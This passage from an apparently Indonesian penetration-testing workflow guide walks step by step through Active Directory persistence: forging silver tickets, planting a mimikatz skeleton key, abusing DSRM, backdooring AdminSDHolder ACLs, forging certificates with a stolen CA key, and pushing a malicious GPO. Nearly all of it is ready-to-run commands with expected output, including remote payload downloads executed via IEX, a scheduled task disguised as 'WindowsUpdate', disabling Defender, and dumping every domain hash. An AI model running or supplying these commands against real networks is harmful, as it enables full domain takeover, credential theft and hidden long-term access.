    "administrator" \
    -outfile ~/persistence/silver/silver_cifs.ccache

# Contoh: Silver ticket untuk WinRM
impacket-ticketer \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "wsman/$TARGET_HOSTNAME.$DOMAIN" \
    "administrator" \
    -outfile ~/persistence/silver/silver_wsman.ccache

# Contoh: Silver ticket untuk MSSQL
impacket-ticketer \
    -nthash "$SERVICE_NTLM" \
    -domain-sid "$DOMAIN_SID" \
    -domain "$DOMAIN" \
    -spn "MSSQLSvc/db.$DOMAIN:1433" \
    "sqladmin" \
    -outfile ~/persistence/silver/silver_mssql.ccache
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Creating service ticket
[*] User     : administrator
[*] SPN      : cifs/DC01.corp.local
[*] Saving ticket in silver_cifs.ccache
```

---

### Langkah 2.4 — Gunakan Silver Ticket

Bash

```
# Load CIFS ticket
export KRB5CCNAME="$HOME/persistence/silver/silver_cifs.ccache"
klist

# Akses SMB dengan ticket
smbclient \
    "//$TARGET_HOSTNAME.$DOMAIN/C$" \
    -k \
    --no-pass

# Atau dengan psexec
impacket-psexec \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOSTNAME.$DOMAIN"
```

**OUTPUT BERHASIL ✅:**

text

```
smb: \> dir
  .                                   D        0  Mon Sep  8 15:00:00 2026
  ..                                  D        0  Mon Sep  8 15:00:00 2026
  $Recycle.Bin                       DH        0  ...
  Windows                             D        0  ...
```

**OUTPUT GAGAL ❌ — KRB_AP_ERR_BAD_INTEGRITY:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY
```

➡️ Service key (NT hash) salah. Dump ulang hash untuk computer/service account yang tepat.

**OUTPUT GAGAL ❌ — KDC_ERR_S_PRINCIPAL_UNKNOWN:**

text

```
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN
```

➡️ SPN tidak ada atau salah format:

Bash

```
# Cek SPN yang benar-benar terdaftar
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP | grep -i "$TARGET_HOSTNAME"
# Atau via nxc
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --query "(servicePrincipalName=*)" "servicePrincipalName"
```

> **🔍 Google search jika stuck:**  
> `"silver ticket KRB_AP_ERR_BAD_INTEGRITY impacket" site:reddit.com OR site:github.com`

---

## ═══════════════════════════════════════

## FASE 3: SKELETON KEY — TEMPORARY IN-MEMORY BACKDOOR

## ═══════════════════════════════════════

> **Prasyarat:** Interactive shell di DC dengan DA privilege  
> **Warning:** Tidak persistent setelah reboot. Noisy ke EDR/AV.  
> **Kapan pakai:** Butuh akses cepat sementara, dalam CTF/lab

### Langkah 3.1 — Deploy Skeleton Key (Dari Windows Shell di DC)

Bash

```
# Jika sudah punya shell di DC via evil-winrm atau psexec:
# Upload mimikatz ke DC
# Dari Parrot/Kali:
evil-winrm -i $DC_IP -u "$USERNAME" -p "$PASSWORD"
```

**Di dalam evil-winrm shell:**

PowerShell

```
# Upload mimikatz
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

# Jalankan skeleton key
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"
```

**OUTPUT BERHASIL ✅:**

text

```
Privilege '20' OK
[*] Skeleton Key installed
```

**Test dari Linux setelah skeleton key aktif:**

Bash

```
# Password default skeleton key adalah "mimikatz"
# Test ke semua user dengan password ini
nxc smb $DC_IP -u "administrator" -p "mimikatz" --local-auth
nxc smb $DC_IP -u "someuser" -p "mimikatz"

# Jika berhasil:
impacket-psexec "$DOMAIN/administrator:mimikatz@$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
SMB   10.10.10.10  445  DC01  [+] CORP\administrator:mimikatz (Pwn3d!)
```

**OUTPUT GAGAL ❌ — Mimikatz blocked:**

text

```
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

➡️ AV/EDR blocking. Coba:

PowerShell

```
# Disable Defender dulu (butuh admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Atau jalankan dari memory (tidak ke disk)
# Download via IEX
IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command "privilege::debug misc::skeleton"
```

**⚠️ PENTING:** Skeleton key hilang setelah DC reboot. Selalu kombinasikan dengan persistence lain (Golden Ticket) untuk long-term access.

---

## ═══════════════════════════════════════

## FASE 4: DSRM ABUSE — DC LOCAL BACKDOOR

## ═══════════════════════════════════════

> **Prasyarat:** DA + akses registry ke DC  
> **Kenapa berguna:** DSRM account adalah local admin DC yang BERBEDA dari domain account. Tidak ikut password policy domain.

### Langkah 4.1 — Dump DSRM Credential

Bash

```
# DSRM adalah local account di DC, bukan domain account
# Dump local SAM dari DC
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -sam \
    | tee ~/persistence/dsrm/dsrm_dump.txt

# Atau dump semua secrets
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    | grep -A2 "Dumping local SAM" \
    | tee ~/persistence/dsrm/dsrm_dump.txt
```

**OUTPUT BERHASIL ✅ — DSRM hash di SAM:**

text

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:DSRM_NTLM_HASH_HERE:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Bash

```
export DSRM_NTLM="DSRM_NTLM_HASH_HERE"
echo "DSRM_NTLM=$DSRM_NTLM" >> ~/persistence/dsrm/keys.txt
```

**⚠️ PENTING:** `Administrator` di sini adalah `DC01\Administrator` (local), BUKAN `CORP\Administrator` (domain). Ini dua akun berbeda!

**OUTPUT GAGAL ❌ — Tidak menemukan DSRM hash:**

text

```
[*] Dumping local SAM hashes
[*] No local SAM hashes found
```

➡️ Kemungkinan dump tidak berhasil atau path berbeda. Coba:

Bash

```
# Dump via registry hives langsung
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

### Langkah 4.2 — Enable DSRM Remote Logon

Bash

```
# Cek nilai sekarang
impacket-reg "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query \
    "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DSRMAdminLogonBehavior
```

**OUTPUT — Nilai Registry:**

|Nilai|Arti|
|---|---|
|Key tidak ada|Remote DSRM disabled (default)|
|`0x0`|Disabled|
|`0x1`|Hanya saat network tidak terhubung|
|`0x2`|**Always allow** (yang kita butuhkan)|

Bash

```
# Set ke 2 (enable remote DSRM login)
impacket-reg "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    add \
    "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DSRMAdminLogonBehavior \
    -vt REG_DWORD \
    -vd 2

# Verifikasi
impacket-reg "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query \
    "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DSRMAdminLogonBehavior
```

**OUTPUT BERHASIL ✅:**

text

```
DSRMAdminLogonBehavior
REG_DWORD
0x2
```

**OUTPUT GAGAL ❌ — Access denied untuk registry:**

text

```
[-] Access denied
```

➡️ Butuh local admin atau SYSTEM di DC. Coba dari shell yang sudah ada di DC.

---

### Langkah 4.3 — Login dengan DSRM Credential

Bash

```
# PENTING: Gunakan format DC01\Administrator (local account, bukan domain)
# Pass-the-hash dengan DSRM NTLM
impacket-psexec \
    -hashes ":$DSRM_NTLM" \
    "DC01/Administrator@$DC_IP"

# Alternatif
impacket-wmiexec \
    -hashes ":$DSRM_NTLM" \
    "DC01/Administrator@$DC_IP"

# Test via nxc dengan --local-auth
nxc smb $DC_IP \
    -u "Administrator" \
    -H "$DSRM_NTLM" \
    --local-auth
```

**OUTPUT BERHASIL ✅:**

text

```
SMB   10.10.10.10  445  DC01  [+] DC01\Administrator:DSRM_HASH (Pwn3d!)
```

text

```
Microsoft Windows [Version 10.0.17763]
C:\Windows\system32> whoami
dc01\administrator
```

**OUTPUT GAGAL ❌ — Logon failure:**

text

```
[-] SMB SessionError: STATUS_LOGON_FAILURE
```

➡️ Kemungkinan DSRMAdminLogonBehavior belum di-set ke 2, atau hash salah. Verifikasi:

Bash

```
# Cek nilai registry lagi
impacket-reg "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" \
    -v DSRMAdminLogonBehavior
```

> **🔍 Google jika stuck:** `"DSRM abuse impacket DSRMAdminLogonBehavior" site:github.com`

---

## ═══════════════════════════════════════

## FASE 5: ADMINSDHOLDER ABUSE — ACL PERSISTENCE

## ═══════════════════════════════════════

> **Prasyarat:** Write access ke AdminSDHolder object  
> **Durability:** Long-lived, berlaku selama ACL tidak dibersihkan  
> **Kenapa powerful:** SDProp secara otomatis menyebarkan permissions ke semua protected groups setiap ~60 menit

### Langkah 5.1 — Baca ACL AdminSDHolder Saat Ini

Bash

```
# Command 1: Baca ACL dengan dacledit
impacket-dacledit \
    -action read \
    -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP" \
    | tee ~/persistence/adminsdholder_acl_before.txt

# Command 2: Alternatif via ldapsearch
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=corp,DC=local" \
    -w "$PASSWORD" \
    -b "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    "(objectClass=*)" \
    nTSecurityDescriptor 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Reading ACL of object: CN=AdminSDHolder,CN=System,DC=corp,DC=local
[*] Found 15 ACEs for AdminSDHolder
Ace[0]: Owner: CORP\Domain Admins
Ace[1]: CORP\Domain Admins - GenericAll
...
```

---

### Langkah 5.2 — Tambahkan ACE ke AdminSDHolder

Bash

```
# Tambahkan FullControl untuk user yang kamu kontrol (bukan admin bawaan)
# Contoh: berikan kontrol ke user "regularuser"
export BACKDOOR_USER="regularuser"

# Command 1: Tambahkan GenericAll ACE
impacket-dacledit \
    -action write \
    -rights FullControl \
    -principal "$BACKDOOR_USER" \
    -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"

# Command 2: Alternatif dengan WriteDACL saja (lebih subtle)
impacket-dacledit \
    -action write \
    -rights WriteDacl \
    -principal "$BACKDOOR_USER" \
    -target-dn "CN=AdminSDHolder,CN=System,DC=corp,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Writing ACE for CN=AdminSDHolder,CN=System,DC=corp,DC=local
[+] ACE added successfully
```

**OUTPUT GAGAL ❌ — dacledit tidak ada:**

text

```
bash: impacket-dacledit: command not found
```

➡️ Install atau cari path:

Bash

```
find / -name "dacledit.py" 2>/dev/null
# Atau install bloodyAD sebagai alternatif
pip3 install bloodyAD
bloodyAD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --host $DC_IP add genericAll \
    "CN=AdminSDHolder,CN=System,DC=corp,DC=local" "$BACKDOOR_USER"
```

---

### Langkah 5.3 — Tunggu atau Force SDProp

Bash

```
# Opsi A: Tunggu 60 menit (SDProp berjalan otomatis di PDC Emulator)
echo "[*] Menunggu SDProp (60 menit)..."
sleep 3600

# Opsi B: Force trigger SDProp via LDAP (lebih cepat untuk CTF)
# Ini modify rootDSE untuk trigger immediate SDProp
ldapmodify -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=corp,DC=local" \
    -w "$PASSWORD" << EOF
dn:
changetype: modify
add: runProtectAdminGroupsTask
runProtectAdminGroupsTask: 1
EOF

# Opsi C: Via PowerShell jika punya Windows shell
# Invoke-Command -ComputerName DC01 -ScriptBlock {
#     $task = [adsi]"LDAP://CN=AdminSDHolder,CN=System,DC=corp,DC=local"
# }
```

**OUTPUT BERHASIL ✅ — SDProp triggered:**

text

```
modifying entry ""
```

---

### Langkah 5.4 — Verifikasi Propagasi ke Protected Groups

Bash

```
# Cek apakah ACE sudah menyebar ke Domain Admins group
impacket-dacledit \
    -action read \
    -target-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local" \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP" \
    | grep -i "$BACKDOOR_USER"
```

**OUTPUT BERHASIL ✅ — ACE ada di Domain Admins:**

text

```
Ace[X]: CORP\regularuser - GenericAll
```

➡️ Sekarang `regularuser` punya kontrol ke Domain Admins group, bahkan jika password admin diganti!

Bash

```
# Test: Dengan regularuser, tambahkan diri ke Domain Admins
net rpc group addmem "Domain Admins" "$BACKDOOR_USER" \
    -U "$DOMAIN/$BACKDOOR_USER%regularpassword" \
    -S "$DC_IP"
```

---

## ═══════════════════════════════════════

## FASE 6: GOLDEN CERTIFICATE — PKI-BASED PERSISTENCE

## ═══════════════════════════════════════

> **Prasyarat:** CA private key (dari AD CS exploitation, lihat **[🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs)**)  
> **Durability:** Sangat tinggi — KRBTGT reset tidak membatalkan ini  
> **Kenapa berbeda dari Golden Ticket:** Berasal dari PKI trust, bukan Kerberos trust

### Langkah 6.1 — Dapatkan CA Private Key

Bash

```
# Command 1: Certipy untuk dump CA private key
certipy ca \
    -backup \
    -ca "corp-DC01-CA" \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip $DC_IP \
    | tee ~/persistence/certificates/ca_dump.txt

# Command 2: Jika sudah tahu CA name
certipy ca \
    -backup \
    -ca "corp-DC01-CA" \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -target $DC_IP
```

**OUTPUT BERHASIL ✅ — CA backup berhasil:**

text

```
[*] CA Name: corp-DC01-CA
[*] Saved certificate and private key to 'corp-DC01-CA.pfx'
```

Bash

```
export CA_PFX="corp-DC01-CA.pfx"
cp "$CA_PFX" ~/persistence/certificates/
```

**OUTPUT GAGAL ❌ — CA name tidak diketahui:**

text

```
[-] No CA name specified
```

➡️ Cari CA name:

Bash

```
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip $DC_IP \
    | grep -i "CA Name"

# Atau via nxc
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M adcs
```

**OUTPUT GAGAL ❌ — Tidak punya permission backup CA:**

text

```
[-] Access denied: backup CA
```

➡️ Butuh Certificate Authority Administrator rights. Cek apakah ada template abuse path → **<a href="/docs/adcs" class="text-[#00b4d8] hover:underline font-mono font-semibold">40_adcs_workflow.md</a>**

---

### Langkah 6.2 — Forge Certificate dengan CA Key

Bash

```
# Forge certificate untuk administrator
certipy forge \
    -ca-pfx "~/persistence/certificates/$CA_PFX" \
    -upn "administrator@$DOMAIN" \
    -out ~/persistence/certificates/admin_forged.pfx

# Verifikasi certificate yang di-forge
openssl pkcs12 \
    -in ~/persistence/certificates/admin_forged.pfx \
    -info \
    -nodes \
    -passin pass: 2>/dev/null \
    | grep -E "Subject|Validity|Not After"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Saving certificate to 'admin_forged.pfx'
```

text

```
subject=CN = administrator, UPN = administrator@corp.local
Not After : Sep  8 15:00:00 2027 GMT
```

---

### Langkah 6.3 — Autentikasi dengan Forged Certificate

Bash

```
# PKINIT auth untuk dapatkan TGT
certipy auth \
    -pfx ~/persistence/certificates/admin_forged.pfx \
    -dc-ip $DC_IP \
    | tee ~/persistence/certificates/auth_output.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Using principal: administrator@corp.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:NTLM_HASH_HERE
```

Bash

```
# Load ccache
export KRB5CCNAME="$HOME/persistence/certificates/administrator.ccache"
klist

# Gunakan untuk akses
impacket-psexec -k -no-pass "$DOMAIN/administrator@DC01.$DOMAIN"
```

**OUTPUT GAGAL ❌ — Certificate mapping failed:**

text

```
[-] Got error while trying to authenticate: KDC_ERR_CLIENT_NAME_MISMATCH
```

➡️ Modern Windows (post-May 2022 patch) mengharuskan SID extension di certificate. Tambahkan SID:

Bash

```
# Dapatkan SID administrator dulu
impacket-lookupsid "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" | grep "Administrator"
# Output: CORP\Administrator S-1-5-21-...-500

export ADMIN_SID="S-1-5-21-1234567890-0987654321-1122334455-500"

# Forge ulang dengan SID
certipy forge \
    -ca-pfx "~/persistence/certificates/$CA_PFX" \
    -upn "administrator@$DOMAIN" \
    -sid "$ADMIN_SID" \
    -out ~/persistence/certificates/admin_forged_sid.pfx
```

> **🔍 Google jika stuck:** `"certipy forge KDC_ERR_CLIENT_NAME_MISMATCH StrongCertificateBindingEnforcement"`

---

## ═══════════════════════════════════════

## FASE 7: MALICIOUS GPO — POLICY-BASED PERSISTENCE

## ═══════════════════════════════════════

> **Prasyarat:** Write access ke GPO yang dilink ke OU dengan banyak komputer  
> **Impact:** Bisa jalankan command di semua mesin yang kena GPO

### Langkah 7.1 — Identifikasi GPO yang Bisa Dimodifikasi

Bash

```
# Command 1: List semua GPO via nxc
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --gpol

# Command 2: Enumerate GPO via BloodHound (jika sudah dikumpulkan)
# Buka BloodHound, cari node user → klik "Outbound Object Control" → lihat GPO

# Command 3: Dari Windows shell — PowerView
# Import-Module PowerView.ps1
# Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | 
#     Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -match "BACKDOOR_USER_SID"}

# Command 4: Dari Linux via ldapsearch
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=corp,DC=local" \
    -w "$PASSWORD" \
    -b "CN=Policies,CN=System,DC=corp,DC=local" \
    "(objectClass=groupPolicyContainer)" \
    displayName cn 2>/dev/null \
    | grep -E "displayName|cn:"
```

**OUTPUT BERHASIL ✅ — GPO list:**

text

```
GPO: Default Domain Policy  {31B2F340-016D-11D2-945F-00C04FB984F9}
GPO: Default Domain Controllers Policy  {6AC1786C-016F-11D2-945F-00C04FB984F9}
GPO: Workstation Baseline  {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
```

**Cari GPO yang:**

1. Kamu punya write access
2. Dilink ke OU dengan banyak komputer/user
3. Bukan Default Domain Policy (terlalu terlihat)

---

### Langkah 7.2 — Modifikasi GPO via SharpGPOAbuse

Bash

```
# Jika ada Windows shell di environment:
# Upload SharpGPOAbuse
evil-winrm -i $DC_IP -u "$USERNAME" -p "$PASSWORD"
```

**Di dalam evil-winrm:**

PowerShell

```
# Upload SharpGPOAbuse
upload /opt/SharpGPOAbuse.exe

# Opsi A: Tambahkan user ke local admin via GPO
.\SharpGPOAbuse.exe `
    --AddLocalAdmin `
    --UserAccount "regularuser" `
    --GPOName "Workstation Baseline"

# Opsi B: Tambahkan scheduled task via GPO (lebih persistent)
.\SharpGPOAbuse.exe `
    --AddComputerTask `
    --TaskName "WindowsUpdate" `
    --Author "NT AUTHORITY\SYSTEM" `
    --Command "powershell.exe" `
    --Arguments "-c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')" `
    --GPOName "Workstation Baseline"

# Force refresh GPO
gpupdate /force
```

**OUTPUT BERHASIL ✅:**

text

```
[+] Domain Controller successfully contacted
[+] Modified GPO settings
[+] GPO modified successfully
```

**Verifikasi dari Linux:**

Bash

```
# Tunggu GPO apply (90 detik default), lalu test
sleep 90
nxc smb 10.10.10.20 -u "regularuser" -p "regularpassword" --local-auth
# Jika Pwn3d! → berhasil jadi local admin via GPO
```

**OUTPUT GAGAL ❌ — GPO tidak ada atau tidak ada write access:**

text

```
[-] No GPO found with name "Workstation Baseline"
```

➡️ Cek nama GPO yang benar dan pastikan punya write access.

> **🔍 Google jika stuck:** `"SharpGPOAbuse AddLocalAdmin no permissions" site:github.com`

---

## ═══════════════════════════════════════

## FASE 8: POST-PERSISTENCE — SIMPAN DAN ORGANISIR

## ═══════════════════════════════════════

> Setelah dapat satu atau lebih persistence, kumpulkan semua info penting.

### Langkah 8.1 — Master Credentials File

Bash

```
# Buat file ringkasan semua persistence yang berhasil
cat > ~/persistence/MASTER_PERSISTENCE.txt << EOF
===== DOMAIN PERSISTENCE SUMMARY =====
Date: $(date)
Target: $DOMAIN ($DC_IP)

=== GOLDEN TICKET ===
KRBTGT NTLM: $KRBTGT_NTLM
KRBTGT AES256: $KRBTGT_AES256
Domain SID: $DOMAIN_SID
Ticket file: ~/persistence/golden/administrator.ccache

=== DSRM (if obtained) ===
DSRM NTLM: $DSRM_NTLM
Login: impacket-psexec -hashes ":$DSRM_NTLM" "DC01/Administrator@$DC_IP"

=== CA KEY (if obtained) ===
CA PFX: ~/persistence/certificates/$CA_PFX
Forge cmd: certipy forge -ca-pfx $CA_PFX -upn administrator@$DOMAIN

=== NOTES ===
- Golden ticket ccache expires when KRBTGT rotated twice
- DSRM only works when DSRMAdminLogonBehavior = 2 in registry
- CA cert persistence survives KRBTGT rotation
EOF

cat ~/persistence/MASTER_PERSISTENCE.txt
```

---

### Langkah 8.2 — Quick Test Semua Persistence

Bash

```
# Test Golden Ticket
export KRB5CCNAME="$HOME/persistence/golden/administrator.ccache"
nxc smb $DC_IP -k --no-pass -d $DOMAIN -u "administrator" 2>/dev/null \
    && echo "[+] GOLDEN TICKET: WORKING" \
    || echo "[-] GOLDEN TICKET: FAILED"

# Test DSRM (jika ada)
nxc smb $DC_IP -u "Administrator" -H "$DSRM_NTLM" --local-auth 2>/dev/null \
    && echo "[+] DSRM: WORKING" \
    || echo "[-] DSRM: FAILED/NOT SET"

# Test Golden Certificate (jika ada)
export KRB5CCNAME="$HOME/persistence/certificates/administrator.ccache"
nxc smb $DC_IP -k --no-pass -d $DOMAIN -u "administrator" 2>/dev/null \
    && echo "[+] GOLDEN CERT: WORKING" \
    || echo "[-] GOLDEN CERT: FAILED"
```

---

### Langkah 8.3 — Cross-Service Testing dengan Persistence

Bash

```
# Setelah dapat Golden Ticket, test ke service lain
export KRB5CCNAME="$HOME/persistence/golden/administrator.ccache"

# SMB → sudah ditest
# WinRM
nxc winrm $DC_IP -k --no-pass -d $DOMAIN -u "administrator" 2>/dev/null

# Dump semua hash dari domain (untuk lateral movement)
impacket-secretsdump -k -no-pass "$DOMAIN/administrator@DC01.$DOMAIN" \
    | tee ~/persistence/logs/all_domain_hashes.txt

# BloodHound collection ulang dengan DA access
bloodhound-python \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -ns $DC_IP \
    -d $DOMAIN \
    -c All \
    --zip \
    -o ~/persistence/logs/bloodhound/
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`KRB_AP_ERR_SKEW`|Clock skew > 5 menit|`sudo rdate -s $DC_IP`|
|`KRB_AP_ERR_MODIFIED`|Hash/SPN salah, pakai IP bukan hostname|Pakai FQDN, cek hash|
|`KDC_ERR_TGT_REVOKED`|KRBTGT di-rotate|Dump ulang KRBTGT|
|`Encryption type not supported`|Key type mismatch|Gunakan AES256 bukan RC4|
|`KDC_ERR_CLIENT_NAME_MISMATCH`|Strong mapping enforcement|Tambahkan -sid ke certipy forge|
|`Access denied DCSync`|Bukan DA/tidak punya replication rights|Cek ACL via dacledit|
|`klist: No credentials cache`|KRB5CCNAME path salah|`export KRB5CCNAME=$(pwd)/file.ccache`|
|`DSRMAdminLogonBehavior not found`|Key belum dibuat|Set ke 2 via impacket-reg|
|`SharpGPOAbuse: no write access`|GPO ACL tidak memberi write|Cari GPO lain yang writable|
|`certipy forge: invalid CA`|CA PFX tidak valid/rusak|Backup ulang CA|
|`SDProp tidak propagasi`|Waktu belum 60 menit atau tidak di PDCE|Tunggu atau force trigger|
|`klist shows expired ticket`|Ticket expired|Forge ulang dengan ticketer|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Sudah dapat DA/Equivalent
│
├─ FASE 0: Verifikasi Privilege
│   ├─ [Pwn3d! + DCSync works] → Lanjut semua opsi
│   └─ [Bukan DA] → Ke windows_privesc / ad_acl_abuse
│
├─ FASE 1: Golden Ticket (PRIORITAS UTAMA)
│   ├─ [KRBTGT dumped] → Forge ccache → Test psexec -k
│   └─ [DCSync denied] → Cek replication rights → Fase 2
│
├─ FASE 2: Silver Ticket (Jika KRBTGT gagal/butuh spesifik)
│   ├─ [Service hash didapat] → Forge TGS → Akses service spesifik
│   └─ [Tidak ada service hash] → Ke Fase 3
│
├─ FASE 3: Skeleton Key (Butuh interactive DC shell)
│   ├─ [Mimikatz berhasil] → Test dengan password "mimikatz"
│   └─ [AV blocking] → Disable Defender atau pakai in-memory loader
│
├─ FASE 4: DSRM (Long-term local backdoor di DC)
│   ├─ [SAM dump berhasil] → Set registry → Test login
│   └─ [Registry denied] → Butuh shell di DC dulu
│
├─ FASE 5: AdminSDHolder (ACL-based long-term)
│   ├─ [dacledit write berhasil] → Tunggu/force SDProp → Test
│   └─ [Write denied] → User tidak punya cukup rights
│
├─ FASE 6: Golden Certificate (Jika ada AD CS)
│   ├─ [CA backup berhasil] → Forge cert → certipy auth → ccache
│   └─ [No CA/No permission] → Skip fase ini
│
└─ FASE 7: Malicious GPO (Jika ada writable GPO)
    ├─ [GPO writable] → SharpGPOAbuse → Tunggu apply
    └─ [No writable GPO] → Skip fase ini
```

---

## ═══════════════════════════════════════

## CROSS-SERVICE NAVIGATION CHART

## ═══════════════════════════════════════

text

```
Setelah dapat persistence di domain:
     │
     ├──→ Dump ALL hashes          → impacket-secretsdump
     ├──→ Lateral movement         → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
     ├──→ Windows PrivEsc          → <a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>
     ├──→ Linux PrivEsc            → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
     ├──→ BloodHound recon         → <a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>
     └──→ AD CS exploitation       → <a href="/docs/adcs" class="text-[#00b4d8] hover:underline font-mono font-semibold">40_adcs_workflow.md</a>

Golden Ticket → test semua service:
     ├──→ SMB       → psexec/smbclient -k
     ├──→ WinRM     → evil-winrm -k
     ├──→ LDAP      → ldapsearch dengan ccache
     └──→ MSSQL     → impacket-mssqlclient -k
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DC_IP="10.10.10.10"; export DOMAIN="corp.local"
export USERNAME="administrator"; export PASSWORD="Password123!"
export DOMAIN_SID="S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX"
export KRBTGT_NTLM="NTLM_HASH_HERE"
export KRBTGT_AES256="AES256_KEY_HERE"
mkdir -p ~/persistence/{golden,silver,certificates,gpo,dsrm,logs}

# === DUMP KRBTGT ===
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -just-dc-user "krbtgt"

# === GET DOMAIN SID ===
impacket-lookupsid "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" | head -5

# === FORGE GOLDEN TICKET ===
impacket-ticketer -nthash "$KRBTGT_NTLM" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" "administrator"
export KRB5CCNAME="$(pwd)/administrator.ccache"
klist

# === USE GOLDEN TICKET ===
impacket-psexec -k -no-pass "$DOMAIN/administrator@DC01.$DOMAIN"
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@DC01.$DOMAIN"
smbclient "//DC01.$DOMAIN/C$" -k --no-pass

# === FORGE SILVER TICKET ===
impacket-ticketer -nthash "$SERVICE_NTLM" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -spn "cifs/DC01.$DOMAIN" "administrator"

# === DSRM ===
impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" -sam
impacket-reg "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" -v DSRMAdminLogonBehavior -vt REG_DWORD -vd 2
impacket-psexec -hashes ":$DSRM_NTLM" "DC01/Administrator@$DC_IP"

# === GOLDEN CERTIFICATE ===
certipy ca -backup -ca "corp-DC01-CA" -u "$USERNAME@$DOMAIN" -p "$PASSWORD" -dc-ip $DC_IP
certipy forge -ca-pfx corp-DC01-CA.pfx -upn "administrator@$DOMAIN"
certipy auth -pfx administrator_forged.pfx -dc-ip $DC_IP

# === SYNC TIME (FIX CLOCK SKEW) ===
sudo rdate -s $DC_IP

# === DUMP ALL HASHES (POST PERSISTENCE) ===
export KRB5CCNAME="$(pwd)/administrator.ccache"
impacket-secretsdump -k -no-pass "$DOMAIN/administrator@DC01.$DOMAIN"
```

---

